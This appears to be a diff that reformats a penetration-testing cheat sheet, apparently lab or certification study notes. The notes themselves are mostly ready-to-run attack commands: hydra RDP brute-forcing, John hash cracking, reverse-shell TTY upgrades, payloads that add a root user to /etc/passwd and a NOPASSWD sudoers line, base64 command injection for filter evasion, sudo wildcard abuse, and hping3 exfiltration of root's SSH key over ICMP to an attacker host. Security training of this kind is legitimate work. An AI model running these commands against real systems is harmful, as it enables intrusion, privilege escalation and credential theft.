@@ -2638,16 +2638,16 @@ sudo john --format=krb5tgs hash.txt --wordlist=/home/kali/Documents/crack/rockyo
 
 **Checklist**
 
-- Proof:
-- Network secret:
-- Passwords and hashes:
-- Dualhomed:
-- Tcpdump:
-- Interesting files:
-- Databases:
-- SSH-keys:
-- Browser:
-- Mail:
+	- Proof:
+	- Network secret:
+	- Passwords and hashes:
+	- Dualhomed:
+	- Tcpdump:
+	- Interesting files:
+	- Databases:
+	- SSH-keys:
+	- Browser:
+	- Mail:
 
 ### Proof
 ```
@@ -2709,13 +2709,6 @@ use auxiliary/sniffer/psnuffle
 .ssh:
 .bash_history
 ```
-
-### Databases
-
-### SSH-Keys
-
-### Browser
-
 ### Mail
 
 ```
@@ -2907,9 +2900,6 @@ Brute Forcing RDP:
 
 hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 
-
-
-
 ```
 
 # Escaping PHP Filters (LFI)
@@ -2925,50 +2915,54 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 
  # Common Errors And Workarounds
 
- su: must be run from a terminal
- 	Summary: This happens when you have a reverse shell via php or nc alone
- 	Solution: Log into box via SSH, or spawn a /bin/bash subprocess via python
-  	Ex: python2 -c 'import pty; pty.spawn("/bin/bash")'
+ 	1) su: must be run from a terminal
+	 	Summary: This happens when you have a reverse shell via php or nc alone
+	 	Solution: Log into box via SSH, or spawn a /bin/bash subprocess via python
+	  	Ex: python2 -c 'import pty; pty.spawn("/bin/bash")'
 
-Folder Is not writable
-	Solution: Move to /tmp
+	2) Folder Is not writable
+		Solution: Move to /tmp
 
- "Connection closed by 192.168.200.107 port 22"
- 	If you receive this with a known id_rsa or password, then most likely the user you are connecting to does not actually exist
+ 	3) "Connection closed by 192.168.200.107 port 22"
+	 	If you receive this with a known id_rsa or password,
+   		then most likely the user you are connecting to does not actually exist
 
  # Spawning Terminal (TTY) Shell From Reverse Shell
 
- /bin/sh -i
-python3 -c 'import pty; pty.spawn("/bin/sh")'
-python3 -c "__import__('pty').spawn('/bin/bash')"
-python3 -c "__import__('subprocess').call(['/bin/bash'])"
-perl -e 'exec "/bin/sh";'
-perl: exec "/bin/sh";
-perl -e 'print `/bin/bash`'
-ruby: exec "/bin/sh"
-lua: os.execute('/bin/sh')
+	Bash:
+		/bin/sh -i
+		 /usr/bin/script -qc /bin/bash /dev/null
 
-    vi: :!bash
-    vi: :set shell=/bin/bash:shell
-    nmap: !sh
-    mysql: ! bash
+  	Python:
+	  	python3 -c 'import pty; pty.spawn("/bin/sh")'
+		python3 -c "__import__('pty').spawn('/bin/bash')"
+		python3 -c "__import__('subprocess').call(['/bin/bash'])"
+	Perl:
+	 	perl -e 'exec "/bin/sh";'
+		perl -e 'print `/bin/bash`'
+	ruby:
+ 		exec "/bin/sh"
+	lua:
+ 		os.execute('/bin/sh')
 
- 
- /usr/bin/script -qc /bin/bash /dev/null
+	vi: :!bash
+	vi: :set shell=/bin/bash:shell
+	nmap: !sh
+	mysql: ! bash
 
-Example: 
-/bin/sh: 0: can't access tty; job control turned off
-$ su root  
-su: must be run from a terminal
-$ /usr/bin/script -qc /bin/bash /dev/null
-www-data@assertion:/$ su root
-su root
-Password: password
-root@assertion:/#     
+	Example: 
+	/bin/sh: 0: can't access tty; job control turned off
+	$ su root  
+	su: must be run from a terminal
+	$ /usr/bin/script -qc /bin/bash /dev/null
+	www-data@assertion:/$ su root
+	su root
+	Password: password
+	root@assertion:/#     
 
  # Inspecting Processes To See Who And When Programs Are Being RUn
 	
- ./pspy64
+ 	./pspy64
  
  # Breaking Out Of Restricted Shells
 
@@ -2986,18 +2980,18 @@ root@assertion:/#
 
 # SSH id_rsa Username Disclosure
 
-Username should be on the last line. Ex: oscp@oscp
-cat id_rsa | base64 -d
-...
-΋~���   oscp@oscp                                
-
-                          
+	Username should be on the last line. Ex: oscp@oscp
+		cat id_rsa | base64 -d
+	...
+	΋~���   oscp@oscp                                
 
 # Last Resort
 
-	root:root
- 	admin:admin
-
+ 	Try Easy Creds:
+		root:root
+ 		admin:admin
+		$username:$username
+  
   	Check /var/mail for leftover mail
   
 
@@ -3008,33 +3002,34 @@ cat id_rsa | base64 -d
 	
 # Local Priv Payloads
 
-Adding user hacker:password to /etc/passwd:
-	echo hacker:2Te6hv5GiOmMc:0:0:root:/root:/bin/bash >> /etc/passwd
-
-Adding Local User To Sudoers
-	echo www-data ALL=(root) NOPASSWD: ALL >> /etc/sudoers
+	Adding user hacker:password to /etc/passwd:
+		echo hacker:2Te6hv5GiOmMc:0:0:root:/root:/bin/bash >> /etc/passwd
+		echo "echo hacker:2Te6hv5GiOmMc:0:0:root:/root:/bin/bash >> /etc/passwd" >> $script
+  
+	Adding Local User To Sudoers
+		echo www-data ALL=(root) NOPASSWD: ALL >> /etc/sudoers
+		echo "echo www-data ALL=(root) NOPASSWD: ALL >> /etc/sudoers" >> $scriptname
 
 # Cracking Password-protected SSH Key With John
 
-Note: This only applies to password-protected SSH keys. They will look something like this:
-	-----BEGIN RSA PRIVATE KEY-----
-	Proc-Type: 4,ENCRYPTED
-	DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E
-	...
- 	-----END RSA PRIVATE KEY-----
+	Note: This only applies to password-protected SSH keys. They will look something like this:
+		-----BEGIN RSA PRIVATE KEY-----
+		Proc-Type: 4,ENCRYPTED
+		DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E
+		...
+	 	-----END RSA PRIVATE KEY-----
   
-Convert the id_rsa into a ssh Hash:
-	ssh2john id_rsa > ssh.hash
-
-Crack With John: 
-	john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
-
-Connect up like so: ssh -i id_rsa daniela@192.168.50.244
-	Enter in the password found from john. id_rsa is required to be specified during connection
+	1) Convert the id_rsa into a ssh Hash:
+		ssh2john id_rsa > ssh.hash
+	2) Crack With John: 
+		john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+	3) Connect up like so: ssh -i id_rsa daniela@192.168.50.244
+		Enter in the password found from john. id_rsa is required to be specified during connection
+  
   # Command Injection Via Base64
 
-  $(echo "BASE64_ENCODED_COMMAND" | base64 -d)
- 	Will decode and run the command. Useful when escaping filters.
+  	$(echo "BASE64_ENCODED_COMMAND" | base64 -d)
+ 		Will decode and run the command. Useful when escaping filters.
   
   # Wordpress
 
@@ -3050,42 +3045,42 @@ Connect up like so: ssh -i id_rsa daniela@192.168.50.244
 
   # Exploiting Wildcards With Sudo Permissions
 
-webadmin@serv:/notes$ sudo nice /notes/../bin/sh
+	webadmin@serv:/notes$ sudo nice /notes/../bin/sh
 
-(root) whoami
-root
-(root) exit
-webadmin@serv:/notes$ sudo -l
-User webadmin may run the following commands on serv:
-    (ALL : ALL) /bin/nice /notes/*
-webadmin@serv:/notes$ ls /notes
-clear.sh  id.sh
-webadmin@serv:/notes$ 
+	(root) whoami
+	root
+	(root) exit
+	webadmin@serv:/notes$ sudo -l
+	User webadmin may run the following commands on serv:
+	    (ALL : ALL) /bin/nice /notes/*
+	webadmin@serv:/notes$ ls /notes
+	clear.sh  id.sh
+	webadmin@serv:/notes$ 
 
 # Assessing Creds From Process Dump
 
-Summary: Occassionally you will have sudo/admin access to a tool that can dump process memory to disk,
-	 As a low priv user. Dump to file. then use the strings command to find interesting passwords
-
-  Typcial processes include: password manager, SSH login, etc
+	Summary: Occassionally you will have sudo/admin access to a tool that can dump process memory to disk,
+		 As a low priv user. Dump to file. then use the strings command to find interesting passwords
+	
+	  Typcial processes include: password manager, SSH login, etc
 
 # Smuggling Data With ICMP
 
-Summary: Tools like hping3 can be used to read local files and send the contents of it to a remote host. 
-	 This is useful to read /etc/shadow or root's id_rsa.
-  	 Note that the -d option means amount of bytes to output with 1 packet
-    	 It is recommended to do -c 1 unless the file is massive
-  
-On Target machine, outputting to other local session: 
-	hping3 --icmp 127.0.0.1 -d 2602 --sign signature --file /root/.ssh/id_rsa -c 1
-
-Receiver Side:
- 	sudo hping3 --icmp 127.0.0.1 --listen signature --safe 
-
-On Target machine, outputing to Kali:
-  	hping3 --icmp 192.168.x.x -d 100 --file /root/.ssh/id_rsa 
-
-On kali machine
-  	sudo python ./icmp_receiver.py
+	Summary: Tools like hping3 can be used to read local files and send the contents of it to a remote host. 
+		 This is useful to read /etc/shadow or root's id_rsa.
+	  	 Note that the -d option means amount of bytes to output with 1 packet
+	    	 It is recommended to do -c 1 unless the file is massive
+	  
+	On Target machine, outputting to other local session: 
+		hping3 --icmp 127.0.0.1 -d 2602 --sign signature --file /root/.ssh/id_rsa -c 1
+	
+	Receiver Side:
+	 	sudo hping3 --icmp 127.0.0.1 --listen signature --safe 
+	
+	On Target machine, outputing to Kali:
+	  	hping3 --icmp 192.168.x.x -d 100 --file /root/.ssh/id_rsa 
+	
+	On kali machine
+	  	sudo python ./icmp_receiver.py
 
 
